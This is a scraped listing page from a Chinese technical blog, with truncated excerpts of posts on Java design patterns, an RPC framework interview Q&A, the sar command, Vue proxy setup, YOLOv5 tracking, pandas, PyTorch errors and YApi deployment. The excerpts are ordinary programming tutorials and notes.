方法接收到的参数是Visitor角色ConcreteElement(具体元素)：ConcreteElement角色负责实现Element角色所定义的接口(API)ObjectStructure(对象数据结构)：ObjectStructur角色负责处理Element角色的集合，能够枚举它的元素（案例二的Directory类同时扮演该角色和ConcreteElement角色） 案例实现 案例一 实现 【Action（Visitor）】
package com.atguigu.visitor; public abstract class Action { /** * 得到男性 的测评 * @param man */ public abstract void getManResult(Man man); /** * 得到女性 的测评 * @param woman */ public abstract void getWomanResult(Woman woman); } 【Success（ConcreteVisitor）】
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9018cc32040b7140b4189b27d623b3f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68efc74d9161adc307ad9301a91af31a/" rel="bookmark">
			RPC项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给我简单介绍下你的项目？
本项目基于Netty、Spring、Zookeeper实现了一个简单的RPC框架，可以支持服务器与客户端之间的长连接，支持心跳检测，采用JSON实现编解码，基于Spring注解进行动态代理的实现调用，最后通过Zookeeper的Watcher机制实现了客户端连接的监控、管理和发现等功能，并实现了服务注册的功能。
你的项目的流程给我介绍一下
首先需要启动Zookeeper服务器，然后通过spring启动RPC的server，此时Rpc的server会把自己注册到Zookeeper中，在Rpc 的server启动过程中，会采用ApplicationListener的监听机制完成server的初始化，之后通过BeanPostProcessor将服务器被自定义注解标记的bean及其方法以类名加方法名的方式存进一个Map中，方便后续客户端启动后的调用
客户端的的启动类为TcpClient，通过该类的静态方法实现netty客户端的初始化，同时客户端会向zookeeper获取服务器列表与服务器相连，在启动过程中，会对指定的方法完成动态代理，因为rpc的本质就是向调用本地方法一样进行网络通信，所以动态代理的目的就是完成通信过程中的配置，比如将调用方法和要传递的参数封装成一个request发送给服务器，从而实现对调用者隐藏通信细节的目的。最后基于Zookeeper的watcher机制完成了客户端对服务器节点的监视功能
你的项目的架构是怎样的？你的项目具有哪些特别的点？为什么要做这个项目？ 传统的curd项目技术含量比较低，对于技术的追求才想做一个rpc项目，可以把平时学到的技术运用到里面，于是基于netty和rpc框架的学习，做了一个简易的rpc项目
你知道dubbo么？那你的项目和dubbo有什么区别？x
Dubbo是阿里开发的一个rpc框架，这个项目算的上是dubbo的精简版，例如项目只支持JSON的序列化，dubbo支持的序列化形式更多更全面；项目只使用netty+spring做服务器，而dubbo的服务器支持tomcat、netty等容器，另外，该项目的动态代理使用的是spring的动态代理，dubbo则是使用的javassist。
短链接，长链接： 由于采用TCP作为传输协议，如果采用短链接的话，频繁的创建和断开连接会有很多网络消耗，这和预期的高性能RPC并不符合
长连接的实现主要通过zookeeper，服务器节点会被注册到zookeeper中，客户端每次获取服务器地址时，会把返回的ChannelFuture存在一个set里面，每次发送请求都从set中取出ChannelFuture发送消息，并且发送消息后不关闭连接，这就保证了客户端和服务器之间的长连接
基于TCP 还是http，为什么用TCP实现 基于TCP实现，因为http协议本身是无状态协议无法对客户端的请求和响应进行关联，并且http数据包较大，并不符合高性能RPC的预期，且TCP是可靠的网络传输协议，能保证数据正确性
同步阻塞调用性能瓶颈：有什么瓶颈？ X 你怎么解决的，怎么实现异步调用的？
同步阻塞的缺点是调用线程会阻塞在请求中，cpu并不会切换到其他线程，如果服务器一直不返回消息，客户端就会一直被阻塞，并且同步阻塞会使线程数和客户连接数是一一对应的关系，需要频繁的创建新的线程，而线程又是java中比较珍贵的资源
Netty本身就是基于Nio开发的非阻塞的IO，本项目也是采用netty作为通信框架
为什么需要心跳检测,客户端发送请求服务端没回应会造成什么(X)？心跳检测机制你是怎么实现的？(X)
心跳检测主要是为了增加该rpc项目的可靠性设计的，因为一般晚上不会有太多的业务请求，如果此时客户端出现了故障，等到第二天大量的请求就可能呢会冲垮客户端的连接，导致大量的请求出现无法响应的情况。
心跳机制的实现通过netty自带的idleStateHandler以及重写userEveentTriggered方法实现的，在读写空闲时设定向已连接的客户端发送ping消息，如果客户端能及时返回ping消息，说明客户端连接正常，如果读写空闲甚至到了读空闲仍没有接收到客户端发送的ping，说明该客户端的连接出现了问题，服务器就会关闭和该客户端的连接，客户端需要在断线后进行重新连接。
什么叫做序列化？Java原生序列化问题(-)？为什么用JSON，怎么实现的JSON序列化，和JAVA序列化速度的差异？(x)
网络只能传递二进制数据，并不能以对象的方式传输数据，序列化就是一种把对象转成二进制数据的算法，并且这种转换是可逆的。
Java原生的序列化最主要的问题就是不能够跨语言，并且序列化的性能低，序列化后的文件大小比较大
JSON是一种Key-value类型的，典型的文本型序列化框架。
JSON序列化是通过FastJson框架实现的，把对象转换成json格式的数据
使用FastJson框架实现Json的编解码速度会比java原生序列化方式要快，且序列化后的码流也比较小
为什么用JSON，应该还有其他更快的吧？(-)
比较常见的还有protobuf、protoStuff、Hession，序列化性能更好并且数据报更小，protobuf有自己的数据类型和格式，使用时需要自己写IDL文件，并通过相对应的程序转换成Java对象的格式，比较麻烦，但可以跨语言并且性能很好。
Hession并没有那么麻烦，并且序列化性能比Json和java原生的序列化性能更好，比较适合rpc框架，但是并不支持java全部的数据类型，例如LinkedHashMap等
你还知道哪些序列化的方式？
还有facebook的thrift，JBoss Marshelling
你是怎么基于动态代理进行的请求处理？用的哪一种？为什么使用这种?(X)
使用Spring 的CGLIB进行动态代理，在interruput方法中对方法进行横切扩展，主要是将请求参数封装成一个ClientRequest类，并使用Netty将请求发送出去。
Spring Cglib的好处是可以对类进行动态代理，而jdk的动态代理只能针对接口
解决进程通信问题这个我不太懂，你的项目哪里遇到进程通信问题了？ (X)
客户端发送大量请求的时候，服务器的响应可能会产生并发问题，导致出现进程通信问题。
你是怎么解决进程通信问题的？(X)
通过引入wait和notify机制，使用可重入锁ReentrantLock和Condition进行控制
首先创建锁
在主线程获取结果前，先等待结果
在获取结果前，先加锁，防止多线程同时获取结果
如果没有获得结果，则进入Condition等待，并在finally中释放锁
当客户端接收到服务器的响应时，唤醒锁
你还知道哪些解决进程通信问题的方式？
可以使用锁粒度比较大且并发效果不太好的synchronize锁，volatile、乐观锁CAS机制
TCP/IP 拆包粘包能简单介绍下么？你怎么解决的呢？有没有更好的解决方式？(X Header Body)
TCP协议是基于流的协议，没有消息边界，客户端发送数据时，为了减小通信消耗，可能会将多次发送的数据组合在一起发送，这就是粘包，当要发送的数据太大导致数据包分片时，服务器一次只能获取部分数据，这就是拆包
有几种解决办法
可以使用消息包定长的方法解决，长度不足的使用空格补上
使用特殊分隔符结尾的方式，分隔符标识消息包的结尾，区分整个数据报
在消息头标识数据包的长度，可以通过获取指定字节数的方式获取完整的消息包
你是怎么基于BeanPostProcessor 机制和 ApplicationListener 机制实现客户端的自启 动与基于注解的服务调用
BeanPostProcessor的使用，首先在要调用的属性上加上一个自定义注解RemoteInvoke，通过BeanPostProcessor的postProcessBeforeIntialization方法首先扫描到整个带有RemoteInvoke注解的属性，之后在调用该属性的具体的方法时，使用request封装该属性也就是对象的限定名和方法名以及方法参数发给服务器，指定需要调用的方法，之后服务器接收到这个request对象，并且服务器在启动时也会通过自己的自定义注解把所有属性以及对应的方法封装到一个hashMap里面来，在收到客户端request时在hashMap中查找对应方法并执行该方法，之后返回给客户端执行后的响应结果
ApplicationListenser会监听服务器初始化完毕，并监听所有的ContextRefreshedEvent事件，ApplicationListenser通过onApplicationEvent方法处理事件。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/68efc74d9161adc307ad9301a91af31a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1986349f10f519e5ab807baa8a176052/" rel="bookmark">
			sar命令使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.查看cpu平均负载使用情况2.查看cpu利用率情况3.查看内存4.查看系统swap分区统计情况5.查看IO和传输速率6.查看磁盘使用情况7.统计网络信息8.网络设备通讯失败信息9.统计socket连接信息10.TCP连接的统计 1.查看cpu平均负载使用情况 -q:队列长度和平均负载统计信息
-s:开始时间
-e:截止时间
-f:从指定文件读取
查看12:00到15:00cpu的平均负载使用情况
输出信息说明：
runs-sz:运行队列的长度（等待运行的进程数，每核的CP不能超过3个）
pist-sz:进程列表中的进程（process）和线程（threads）的数量
ldavg-1:最后一分钟的cpu平均负载，就是将多核cpu过去一分钟的负载相加，再除以核心数得到的平均值
ldavg-5:同上
ldavg-15:同上
blocked:
2.查看cpu利用率情况 -u:cpu利用率信息
输出信息说明：
%user:用户空间的cpu使用时间百分比
%nice:改变过优先级的进程的cpu使用时间百分比
%system:内核空间的cpu使用时间百分比
%iowait:等待IO操作所占用的cpu时间百分比
%steal:虚拟机的虚拟机cpu使用的cpu时间百分比
%idle:进程执行所占cpu时间百分比，此数值越大说明系统负载越轻，cpu不繁忙
统计cpu利用率情况，每一秒统计1次，一共统计3次
3.查看内存 -h:以人类可读形式
输出信息说明：
kbmemfree:空闲的物理内存大小
kbavail:可用物理内存大小
kbmemused:已使用的物理内存大小
%memused:物理内存使用率
kbbuffers:内核中作为缓冲区使用的物理内存大小，
kbcached:缓存的文件大小
kbcommit:保证当前系统正常运行所需要的最小内存，即为了确保内存不溢出而需要的最少内存（物理内存+swap分区）
%commit:这个值是kbcommit与内存总量（物理内存+swap分区）的一个百分比的值
kbactive:
kbinact:
kbdirty:
查看内存使用情况
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-G8eK7Ac4-1691031617141)(/Users/liuhuan/Library/Application Support/typora-user-images/image-20230802160301141.png)\
4.查看系统swap分区统计情况 输出信息说明：
pswpin/s:每秒从交换分区到系统的交换页面（swap page）的数量
pgwpout/s:每秒从系统交换到swap的交换页面（swap page）的数量
5.查看IO和传输速率 -b:I/O 和传输速率信息状况
输出信息说明：
tps:磁盘每秒钟的IO总数,等于iostat中的tps
rtps:每秒钟从磁盘中读取的IO总数
wtps:每秒钟写入到磁盘的IO总数
dtps:
bread/s:每秒钟从磁盘读取的总块数
bwrtn/s:没秒钟写入到磁盘的总块数
bdscd/s:
6.查看磁盘使用情况 -p:加上此选项，能显示具体的磁盘名称，不加的话就显示dev253-0类似的设备名称
-d:块设备状况
中间省略......
输出信息说明：
tps:每秒IO的传输总数
rkb/s:每秒读取扇区的总数
wkb/s:每秒写入扇区的总数
dkb/s:每秒删除扇区的总数
areq-sz:平均每次磁盘IO操作的数据大小
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1986349f10f519e5ab807baa8a176052/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99791115ba1d9b11ed7a3d16db9b76eb/" rel="bookmark">
			vue配置代理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 使用vue.config.js文件配置代理： 在Vue项目的根目录下创建一个vue.config.js文件，并添加以下代码：
module.exports = { devServer: { proxy: { '/api': { target: 'http://api.example.com', changeOrigin: true, secure:false, pathRewrite: { '^/api': '/' } } } } } 上述代码中，我们使用devServer配置项来配置代理服务器。其中proxy属性用于配置代理的规则，/api表示需要代理的接口路径。target属性表示代理的目标服务器地址，changeOrigin属性表示是否改变请求的源地址，pathRewrite属性用于重写请求的路径。
2. 使用http-proxy-middleware库配置代理： 在Vue项目的根目录下创建一个vue.config.js文件，并添加以下代码：
const proxyMiddleware = require('http-proxy-middleware'); module.exports = { devServer: { before(app) { app.use( '/api', proxyMiddleware({ target: 'http://api.example.com', changeOrigin: true, pathRewrite: { '^/api': '' } }) ); } } } 上述代码中，我们使用http-proxy-middleware库来配置代理服务器。在before方法中，通过app.use方法来使用代理中间件。'/api'表示需要代理的接口路径，target属性表示代理的目标服务器地址，changeOrigin属性表示是否改变请求的源地址，pathRewrite属性用于重写请求的路径。
3. 使用axios库的代理配置： 如果项目中使用了axios库来发送请求，可以直接在axios的配置中配置代理。在项目的入口文件（比如main.js）中添加以下代码：
import axios from 'axios'; axios.defaults.baseURL = '/api'; axios.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/99791115ba1d9b11ed7a3d16db9b76eb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e8a6679c1ee04cea56b3c870f7b519f/" rel="bookmark">
			基于yolo v5与Deep Sort进行车辆以及速度检测与目标跟踪实战
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目实验结果展示：
基于yolo v5与Deep Sort进行车辆以及速度检测与目标跟踪实战——项目可以私聊
该项目可以作为毕业设计，以及企业级的项目开发，主要包含了车辆的目标检测、目标跟踪以及车辆的速度计算，同样可以进行二次开发。
这里附上主要的检测代码
import torch import numpy as np from models.experimental import attempt_load from utils.general import non_max_suppression, scale_coords from utils.torch_utils import select_device from utils.datasets import letterbox import cv2 from deep_sort.utils.parser import get_config from deep_sort.deep_sort import DeepSort from haversine import haversine, Unit from sys import platform as _platform class Detector: """ yolo目标检测 """ def __init__(self): self.img_size = 1280 self.conf_thres = 0.5 self.iou_thres=0.5 # 目标检测权重 self.weights = 'weights/highway_m_300.pt' self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e8a6679c1ee04cea56b3c870f7b519f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eeacb3f55491467fd411b8ad20d1fac4/" rel="bookmark">
			ST标准库：src文件夹与inc文件夹
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		src文件夹与inc文件夹是ST标准库的主要内容
src和inc文件夹里面是ST公司针对每个STM32外设而编写的库函数文件，每一个外设对应一个.c和.h后缀的文件。我们把这类文件统称为stm32f1x_ppp.或者stm32f10x_ppp.h文件（ppp表示外设名称）例如stm32f10x_gpio.c和stm32f10x_gpio.h文件就属于这一类
在C编程中，ST标准库通常指的是标准库（Standard Library），也就是提供的一组常用功能的函数和头文件。这些函数和头文件可以通过包含相应的头文件来使用。
通常情况下，标准库包含两个主要文件夹：
src文件夹：这个文件夹通常包含标准库的源代码文件，即标准库函数的实现代码。这些源代码文件在编译时会被编译器链接到你的程序中，使你能够使用标准库提供的功能。
inc文件夹：这个文件夹通常包含标准库的头文件，也称为"include"文件。头文件包含了标准库函数的声明，函数原型和常量定义等信息。当你在自己的代码中需要使用标准库的功能时，你需要在代码中包含相应的头文件。
总的来说，标准库的src文件夹包含了函数的实现，而inc文件夹包含了函数的声明，让你的代码能够使用这些功能。这样的设计使得标准库的实现和使用分离开来，方便开发者在自己的代码中使用这些功能，而不需要了解标准库的底层实现细节。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6017075cb6443e95be100d8f00d0beca/" rel="bookmark">
			springboot自定义错误消息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 为了提供自定义错误消息提示，springboot在resources目录下，有一个文件ValidationMessages.properties 用于存储 验证错误的消息提示：
比如：
这样一个ValidationMessage.properties
username.notempty=用户名不能为空 username.length=用户名长度必须在{min}和{max}之间 password.notempty=密码不能为空 password.pattern=密码必须包含至少一个大写字母、一个小写字母和一个数字 调用的时候：
问题 中文出现乱码
默认情况下，java的Properties类使用ISO-8859-1编码加载文件，可能导致中文乱码，，
在springboot中配置# springboot会使用 utf-8 编码加载资源文件，确保中文能够正确的显示 spring.messages.encoding=UTF-8 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17c44223e89d34fb1dea614b0f48bb19/" rel="bookmark">
			前端（HTML5 &#43; CSS3）（学习笔记）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前端开发 最近看了黑马程序员的前端教程，在此记录学习笔记
基础认知 Web标准要求页面实现：结构、表现、行为三层分离
HTML：超文本标记语言 骨架结构标签：html标签（整体）、head标签（头部）、body标签（身体）、title标签（标题）
标签的结构图：开始标签+包裹的内容+结束标签（少数标签只有一部分，即单标签（自成一体，无包裹内容））
快捷键（VS Code） 新建：!+Enter
注释：Crtl+/（选中部分所在行）Alt+Shift+A（选中部分注释）
光标多选：Crtl+D
左缩进：Shift+Tab
跨行多选：中键向下拖
标签 标签可叠加使用
排版标签 注释（Crtl+/）：&lt;!--这是注释--&gt; 标题：&lt;h1&gt;一级标题&lt;/h1&gt;（加粗、独占一行） 段落:&lt;p&gt;这是段落&lt;/p&gt;（段落之间存在间隙、独占一行） 换行：&lt;br&gt; 水平分割线：&lt;hr&gt; 文本格式化标签 &lt;b&gt;加粗&lt;/b&gt;	或	&lt;strong&gt;加粗&lt;/strong&gt; &lt;u&gt;下划线&lt;/u&gt;	或	&lt;ins&gt;下划线&lt;/ins&gt; &lt;i&gt;倾斜&lt;/i&gt;	或	&lt;em&gt;倾斜&lt;/em&gt; &lt;s&gt;删除线&lt;/s&gt;	或	&lt;del&gt;删除线&lt;/del&gt; 媒体标签 &lt;!--媒体标签（图片）--&gt; &lt;img src="../img/1.png" alt="替换文本" title="提示文本" width="900" height="900"&gt; 绝对路径:目录下的绝对位置，可直接到达目标位置 盘符开头：D:\day\img\1.jpg 完整网址：https://www.xxx.com/img/1.png 相对路径：从当前文件夹出发寻找目标文件的过程 ./是当前目录（可省略）；../是父级目录；/是根目录 alt：替换文本，当图片不显示时显示 title：提示文本，鼠标悬停时显示 width、height：宽高，只给一个值时，另一个等比缩放 &lt;!--媒体标签（音频）--&gt; &lt;audio src="../video/1.mp3" controls autoplay loop&gt;&lt;/audio&gt; 音频标签目前支持三种格式：MP3、Wav、Ogg controls：显示播放的控件 autoplay：自动播放（部分浏览器不支持） loop：循环播放 &lt;!--媒体标签（视频）--&gt; &lt;video src="../video/1.mp4" controls autoplay muted loop width="500"&gt;&lt;/video&gt; 视频标签目前支持三种格式：MP3、WebM、Ogg autoplay：自动播放（部分浏览器不支持）（谷歌等浏览器中需配合muted实现静音播放） 链接标签 &lt;a href="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/17c44223e89d34fb1dea614b0f48bb19/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b0d99764de990f4dd1e42d7d3d41813/" rel="bookmark">
			C&#43;&#43;如何用OpenCV中实现图像的边缘检测和轮廓提取？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近有个项目需要做细孔定位和孔距测量，需要做边缘检测和轮廓提取，先看初步效果图： 主要实现代码：
int MainWindow::Test() { // 2.9 单个像素长度um 5倍 double dbUnit = 2.9/(1000*5); // 定义显示窗口 namedWindow("src", WINDOW_NORMAL|WINDOW_KEEPRATIO); namedWindow("threshold", WINDOW_NORMAL|WINDOW_KEEPRATIO); namedWindow("morphologyEx x1", WINDOW_NORMAL|WINDOW_KEEPRATIO); namedWindow("morphologyEx x2", WINDOW_NORMAL|WINDOW_KEEPRATIO); namedWindow("canny", WINDOW_NORMAL|WINDOW_KEEPRATIO); namedWindow("dst", WINDOW_NORMAL|WINDOW_KEEPRATIO); resizeWindow("src", 1080,720); resizeWindow("threshold", 1080,720); resizeWindow("morphologyEx x1", 1080,720); resizeWindow("morphologyEx x2", 1080,720); resizeWindow("canny", 1080,720); resizeWindow("dst", 1080,720); //【1】载入图像 Mat src = imread("0.28um+5x.jpg"); Mat src_clone = src.clone(); if(src.empty()){ qDebug()&lt;&lt;"图片为空"; return 1; } imshow("src",src); //【2】转灰度图 Mat gray; cvtColor(src,gray,COLOR_BGR2GRAY); //imshow("gray",gray); //【3】图像二值化 threshold(gray,gray,130,190,THRESH_BINARY); imshow("threshold",gray); //【4】执行形态学开操作去除噪点 Mat kernel = getStructuringElement(MORPH_RECT,Size(15,15),Point(-1,-1)); morphologyEx(gray,gray,MORPH_CLOSE,kernel,Point(-1,-1),1); imshow("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b0d99764de990f4dd1e42d7d3d41813/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7956da05dc78c9386c4ef122bfea697/" rel="bookmark">
			java中，为什么重写方法的权限要和父类一样或者更大
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Java中，重写方法的权限要和父类一样或者更大，是为了保持程序的安全性和一致性。
首先，如果子类的重写方法比父类的权限更小，那么当父类的方法被其他代码调用时，可能会出现子类无法访问的情况。这可能导致代码执行错误或者无法按照预期的方式工作。
其次，Java的访问权限控制是建立在面向对象的封装性原则上的。父类中的方法拥有较大的访问权限时，表明这个方法是对外暴露的，子类应该保持或扩大相同的权限，以保持对外部代码的一致性。如果子类降低了权限，将破坏封装性，并可能导致对外部代码的违规访问。
最后，Java的重写是通过子类在继承关系中覆盖父类方法来实现的。子类的重写方法应该是对父类方法的特化，所以它的权限应该至少与父类方法相同。如果权限更小，那么子类的行为将限制在比父类更小的范围内，这不符合重写的意义。
总结来说，重写方法的权限要和父类一样或者更大，主要是为了程序的安全性和一致性。这样可以避免运行时错误和保持正确的访问控制。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64c3969514344f050a9283c096eefab6/" rel="bookmark">
			Python导入数据与输出数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、导入数据
1、导入Excel表格数据
2.导入CSV格式数据
3.导入JSON格式数据
4.导入txt格式数据
5.导入(爬取)网络数据
二、导出数据
1.csv格式数据输出
2.xlsx格式数据输出
3.导入到多个sheet页中
一、导入数据 1、导入Excel表格数据 read excel方法中的参数介绍如下
(1)sheet name参数: 该参数用于指定导入Excel文件中的哪一个sheet，如果不填写这个参数，则默认导入第一个sheet
(2) index col参数: 该参数用于指定表格的哪一列作为DataFrame的行索引从0开始计数
(3)nrows参数: 该参数可以控制导入的行数，该参数在导入文件体积较大时比较有用
(4)skipfooter参数: 该参数可以在导入数据时，跳过表格底部的若干行
(5) header参数:当使用Pandas的read excel方法导入Excel文件时，默认表格的第一行为字段名。如果表格的第一段不是字段名，则需要使用该参数设置字段名
(6)usecols参数:该参数可以控制导入Excel表格中的哪些列
(7)names参数:该参数可以对导入数据的列名进行重命名
import pandas as pd df=pd.read_excel("文件路径",index_col=0,nrows=5,header=None, name=["a","b","c","d","e"],usecols=[1,3]) #index_col=0是将第一列作为索引；nrows=5是导入前五行 #header=None是取消第一行作表头；name是命名表头 #usecols=[1,3]是导入第二列和第四列 2.导入CSV格式数据 read_csv方法中的sep参数表示要导入的csv文件的分隔符，默认值是半角逗号。encoding参数用来指定CSV文件的编码，常用的有utf-8和 gbk。
import pandas as pd df=pd.read_csv("文件路径",sep=",",encoding="gbk",nrows=5,usecols=[1,3], names=["名字","战队","位置"]) 3.导入JSON格式数据 import pandas as pd df=pd.read_json("文件路径") 4.导入txt格式数据 参数和用法与read_csv类似
import pandas as pd df=pd.read_table("文件路径") 5.导入(爬取)网络数据 在Python的数据分析中，除了可以导入文件和数据库中的数据，还有一类非常重要的数据就是网络数据。网络中每天都会产生大量数据，这些数据具有实时性、种类丰富的特点，因此对于数据分析而言是十分重要的一类数据来源。关键技术:爬取网络表格类数据，pandas库read html0方法
read_html方法用于导入带有table标签的网页表格数据。使用该方法前，首先要确定网页表格是否为table标签。具体方法为，鼠标右键单击网页中的表格，在弹出的菜单中选择“查看元素”，查看代码中是否含有表格标签&lt;table&gt;...&lt;/table&gt;的字样，确定后才可以使用read html方法。read html方法常用参数说明如下
io: 字符串，文件路径，也可以是URL链接。网址不接受https，可以尝试去掉https中的s后爬取
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/64c3969514344f050a9283c096eefab6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87ae1ff74c217640f9be18623f1bc252/" rel="bookmark">
			DataLoader worker (pid(s) 13424) exited unexpectedly “nll_loss_forward_reduce_cuda_kernel_2d_index“
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		错误汇总 错误一：DataLoader worker (pid(s) 13424) exited unexpectedly 遇到的错误可能是由于以下原因之一导致的：
数据集中有损坏或无效的文件，导致数据加载器无法读取或解析它们。数据集太大，超过了您的内存或显存的容量，导致数据加载器无法分配足够的空间来存储或处理它们。数据加载器使用了多个进程来加速数据加载，但由于某些原因，这些进程之间的通信出现了问题，导致数据加载器无法同步或接收数据。 为了解决这个问题，可以尝试以下一些方法：
检查数据集中是否有损坏或无效的文件，并删除或修复它们。可以使用一些工具来验证数据集，例如[torchvision.datasets.folder.verify_str_arg]或[torchvision.datasets.folder.is_image_file]。减小批量大小（batch_size）或缩放因子（upscale_factor），以减少每次加载和处理的数据量。这样可以降低内存或显存的压力，避免溢出错误。减少数据加载器使用的进程数（num_workers），或者将其设置为0，以避免多进程之间的通信问题。这样可能会降低数据加载的速度，但也可以避免意外退出错误。 错误二：“nll_loss_forward_reduce_cuda_kernel_2d_index” not implemented for ‘Int’ 思路一：
这个错误的原因可能是目标变量target的数据类型是Int，而不是Long。PyTorch的交叉熵损失函数cross_entropy_loss要求目标变量的数据类型是Long。将target = target.cuda(non_blocking=True)改为target = target.long().cuda(non_blocking=True)，将target = target.cuda()改为target = target.long().cuda()。 def train(train_loader, model, criterion, optimizer): model.train() train_loss = 0.0 for i, (input, target) in enumerate(train_loader): input = input.cuda(non_blocking=True) target = target.long().cuda(non_blocking=True) # 修改了这里，原来是 target = target.cuda(non_blocking=True) # 因为交叉熵损失函数要求目标变量的数据类型是Long，而不是Int output = model(input) loss = criterion(output, target) optimizer.zero_grad() loss.backward() optimizer.step() if i % 20 == 0: print(loss.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/87ae1ff74c217640f9be18623f1bc252/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c69b0f97b42abfa5254faf0bbc3fa045/" rel="bookmark">
			spring boot合并 http请求（前后端实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么要合并http请求 页面加载时要初始化很多资源信息，会发送好多http请求，根据http的通信握手特点，多个http请求比较浪费资源。进而如果能将多个http请求合并为一个发送给服务器，由服务器获取对应的资源返回给客户端
奇思妙解 解1 将所有http请求，包装成一个大的参数
[ {method:'请求方法GET'，url:'user/detail',params:{userId:1}}, // http1 {method:'请求方法GET'，url:'freidn/detail',params:{friend:1}} // http2 ] 上述参数封装了两个http请求，将参数发送给服务器，服务器进行解析，获取两个http请求所需的数据，然后再一起返回
这样虽然完成了 http的合并请求，但是导致了单次的请求时间过长，而且两个http请求必须等待一起完成。不能像原来的那样，一个http获取到数据后就能立即的对数据进行处理
解2 有没有什么办法可以让服务器提供的资源分阶段返回？即http1的数据处理完成后立即响应给客户端，http2 的数据处理完成后立即响应给客户端，当两个http都响应完成后，该请求结束。
遇题不会找百度！！ 发现了 EventSources。立马尝试 百度百科:事件源（Event sources），产生事件的组件或对象称为事件源。事件源产生事件并把它传递给事件监听器（event listeners）。
立马写了个demo尝试了一下 EventSources 可以实现 当http1的数据处理完成后立即响应给客户端，http2 的数据处理完成后立即响应给客户端，两个http都响应完成后，请求结束。
服务端可以开启线程使用SSE，分次写会响应数据
恩，真棒，这么容易解决了，收拾收拾睡觉，躺下了，总感觉哪里不对劲，恩，是的，参数太大，get请求就废了 是的，参数太大了，已经超出了get请求的长度限制，那怎么办？把参数进行压缩然后放入请求头?但是请求头也有大小限制，那用POST？
查询了 EventSources的文档后发现这东西不支持post。那这个想法是不是就泡汤了？ 解3 经过一系列的折腾，感觉的这个想法要泡汤，于是就先放了放，过了一段时间后，灵机一动，能不能自己弄个 EventSource出来？
灵机一动 开始行动 经过磨难 难题终结 效果 将多个http 合并为一个自定义的EventSources,携带参数发起post请求，到服务端，服务端调整为SSE，并开启线程，每条线程处理一个http任务，处理完成后通过SSE写回数据，这时http请求未关闭，仍可让其他http任务的线程继续写回数据。等待所有任务都处理完成后，关闭这一个http请求。
效果图 有需要的可以联系我
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c3f62bb83f806ebe927fa169191c6d8/" rel="bookmark">
			几个常用gurobi调试参考网址
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 用户手册 用户手册
网页上的是最新版本的，其它地方搜到的PDF文档比较旧，还缺了好多函数……
2 错误码 错误码
用户手册的一部分，调试时有一定用处
3 代码例子 c++代码例子
Python代码例子
对照仿写方便一些
其它的用到了再更新再这里
调优化器好难啊……日常跑飞了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0af39695a988dfc3205f1219288731d8/" rel="bookmark">
			YAPI部署服务器(Docker)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【一】YAPI介绍 YApi 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。 【二】部署 【1】环境 node.jsmongodbyapi 【2】更新软件包管理器 使用以下命令更新服务器上的软件包管理器。
对于 Ubuntu/Debian：
sudo apt update 对于 CentOS/RHEL：
